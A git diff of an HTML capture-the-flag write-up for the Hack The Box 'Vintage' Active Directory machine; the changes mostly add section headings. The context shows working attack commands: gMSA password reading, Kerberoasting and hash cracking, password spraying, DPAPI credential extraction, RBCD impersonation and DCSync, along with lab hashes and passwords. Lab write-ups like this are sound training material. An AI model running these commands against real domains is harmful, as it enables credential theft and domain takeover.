@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799082581645">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799084971022">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.7.0">
@@ -32,12 +32,12 @@
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.7.0.799082581645" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.7.0.799084971022" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799082581645" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799082581645" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799082581645" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799084971022" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -191,12 +191,18 @@
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a &#x27;Pre-Created computer account&#x27;, meaning the password is the same as the sAMAccountName of the machine account. The &#x27;Domain Computer&#x27; organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it.</p>
-<doc-anchor-target id="reconnaissance" class="break-words">
+<doc-anchor-target id="synopsis" class="break-words">
     <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<p>Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a &#x27;Pre-Created computer account&#x27;, meaning the password is the same as the sAMAccountName of the machine account. The &#x27;Domain Computer&#x27; organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it.</p>
+<doc-anchor-target id="reconnaissance">
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#reconnaissance">#</doc-anchor-trigger>
         <span>Reconnaissance</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>For this machine we are given some initial credentials to authenticate (<code v-pre>P.Rosa:Rosaisbest123</code>) and the initial nmap scan already shows we are dealing with a Domain Controller.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -271,6 +277,12 @@ svc_ark
 C.Neri_adm
 L.Bianchi_adm</code></pre>
 </doc-codeblock></div>
+<doc-anchor-target id="kerberos-authentication">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#kerberos-authentication">#</doc-anchor-trigger>
+        <span>Kerberos Authentication</span>
+    </h3>
+</doc-anchor-target>
 <p>After using some common queries over ldap, I decided to retry using NetExec with the <code v-pre>-k</code> flag which uses Kerberos as authentication protocol instead of NTLM (default).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
@@ -317,6 +329,12 @@ LDAP        dc01.vintage.htb 389    DC01             Compressing output into /ho
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<doc-anchor-target id="pre-created-computer">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pre-created-computer">#</doc-anchor-trigger>
+        <span>Pre-Created Computer</span>
+    </h3>
+</doc-anchor-target>
 <p>When a new computer account of this type is configured, its password is set based on its name (i.e. lowercase computer name). Let&#x27;s verify if we can get a TGT by using the standard password for this computer account.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py vintage.htb/FS01$ -dc-ip 10.10.11.45
@@ -330,6 +348,12 @@ Password:fs01
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<doc-anchor-target id="readgmsapassword-abuse">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#readgmsapassword-abuse">#</doc-anchor-trigger>
+        <span>ReadGMSAPassword Abuse</span>
+    </h3>
+</doc-anchor-target>
 <p>There are several methods we can use to read this password, but the easiest method is to use <code v-pre>BloodyAD.py</code>. Again we need to do our authentication over Kerberos by using the TGT of <code v-pre>FS01$</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k ccache=FS01$.ccache --host dc01.vintage.htb -d &quot;VINTAGE.HTB&quot; --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
@@ -338,6 +362,12 @@ distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
 msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==</code></pre>
 </doc-codeblock></div>
+<doc-anchor-target id="genericwrite-abuse">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#genericwrite-abuse">#</doc-anchor-trigger>
+        <span>GenericWrite Abuse</span>
+    </h3>
+</doc-anchor-target>
 <p>We got the NTLM hash and the Base64 encoded password. We again retreive the TGT of the GMSA account and add ourself to the <code v-pre>SERVICEMANAGERS</code> group.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py vintage.htb/GMSA01$ -dc-ip 10.10.11.45 -hashes ':a317f224b45046c1446372c4dc06ae53'
@@ -390,6 +420,12 @@ $krb5asrep$23$svc_ark@VINTAGE.HTB:9bcb4e2a1c6d1d742b1216a337217c76$401ee49a4ba46
 distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
 userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH</code></pre>
 </doc-codeblock></div>
+<doc-anchor-target id="restore-disabled-account">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#restore-disabled-account">#</doc-anchor-trigger>
+        <span>Restore Disabled Account</span>
+    </h3>
+</doc-anchor-target>
 <p>With our <code v-pre>GenericAll</code> rights, we can enable the account in order to get the hash.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d &quot;VINTAGE.HTB&quot; --dc-ip 10.10.11.45 remove uac svc_sql -f ACCOUNTDISABLE
@@ -411,7 +447,14 @@ $ hashcat services.hashes -m 18200 $ROCKYOU</code></pre>
         <span>User</span>
     </h2>
 </doc-anchor-target>
-<p>We are only able to crack the password for <code v-pre>svc_sql</code> which is <code v-pre>Zer0the0ne</code>. Well we got a password but the account is not of much use, so lets do some password spraying.</p>
+<p>We are only able to crack the password for <code v-pre>svc_sql</code> which is <code v-pre>Zer0the0ne</code>.</p>
+<doc-anchor-target id="password-spraying">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#password-spraying">#</doc-anchor-trigger>
+        <span>Password Spraying</span>
+    </h3>
+</doc-anchor-target>
+<p>Well we got a password but the account is not of much use, so lets do some password spraying.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
 SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
@@ -448,6 +491,12 @@ Cannot find KDC for realm &quot;VINTAGE.HTB&quot;
 
 Error: Exiting with code 1</code></pre>
 </doc-codeblock></div>
+<doc-anchor-target id="winrm-with-kerberos">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#winrm-with-kerberos">#</doc-anchor-trigger>
+        <span>WinRM with Kerberos</span>
+    </h3>
+</doc-anchor-target>
 <p>When we attempt to connect via WinRM, we got an error that the KDC cannot be found. To fix this we need to edit our <code v-pre>/etc/krb5.conf</code> file as follows:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ cat /etc/krb5.conf
@@ -476,6 +525,12 @@ Error: Exiting with code 1</code></pre>
         <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
         <span>Root</span>
     </h2>
+</doc-anchor-target>
+<doc-anchor-target id="dpapi-credential-extraction">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dpapi-credential-extraction">#</doc-anchor-trigger>
+        <span>DPAPI Credential Extraction</span>
+    </h3>
 </doc-anchor-target>
 <p>We can look for any stored credentials and try to extract them. The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at <code v-pre>C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID</code>. Lets have a look if our user has any credentials stored.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -541,6 +596,12 @@ Username    : vintage\c.neri_adm
 Unknown     : Uncr4ck4bl3P4ssW0rd0312 </code></pre>
 </doc-codeblock></div>
 <p>We found a password for the user <code v-pre>c.neri_adm</code>.</p>
+<doc-anchor-target id="rbcd-attack">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#rbcd-attack">#</doc-anchor-trigger>
+        <span>RBCD Attack</span>
+    </h3>
+</doc-anchor-target>
 <p><figure class="content-center">
     <img src="../../../../assets/images/writeups/vintage/bh-neri-delegate.png" alt="">
     <figcaption class="caption"></figcaption>
@@ -573,6 +634,12 @@ $ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.
 [*] Requesting S4U2Proxy
 [*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache</code></pre>
 </doc-codeblock></div>
+<doc-anchor-target id="dcsync">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dcsync">#</doc-anchor-trigger>
+        <span>DCSync</span>
+    </h3>
+</doc-anchor-target>
 <p>Now we can perform a DCSync attack and grab the root flag.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
